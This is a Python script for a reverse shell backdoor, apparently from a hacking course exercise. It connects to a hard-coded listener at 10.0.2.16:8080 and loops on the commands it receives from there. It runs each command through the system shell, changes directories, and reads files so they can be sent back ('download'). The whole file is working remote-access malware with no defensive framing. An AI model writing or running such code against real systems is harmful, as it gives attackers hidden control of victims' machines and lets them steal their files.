import socket
import subprocess
import json
import os

class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def json_send(self, data):
        json_data = json.dumps(data)  # Convert to JSON
        self.my_connection.send(json_data.encode('utf-8'))  # Send as bytes

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1024).decode('utf-8')  # Decode bytes to string
                return json.loads(json_data)  # Load JSON
            except ValueError:
                continue

    def execute_cd_command(self, directory):
        os.chdir(directory)
        return "Cd to " + directory

    def get_file_contents(self, path):
        with open(path, "rb") as my_file:
            return my_file.read()  # This will still be bytes

    def command_execution(self, command):
        return subprocess.check_output(command, shell=True)

    def start_socket(self):
        while True:
            command = self.json_receive()
            if command[0] == "quit":
                self.my_connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_output = self.execute_cd_command(command[1])
            elif command[0] == "download":
                command_output = self.get_file_contents(command[1])  # Fix the assignment
                # Convert bytes to a Unicode string for sending
                command_output = command_output.decode('utf-8', errors='ignore')  # Ignore decode errors
            else:
                command_output = self.command_execution(command)

            self.json_send(command_output)

        self.my_connection.close()

my_socket_object = MySocket("10.0.2.16", 8080)
my_socket_object.start_socket()
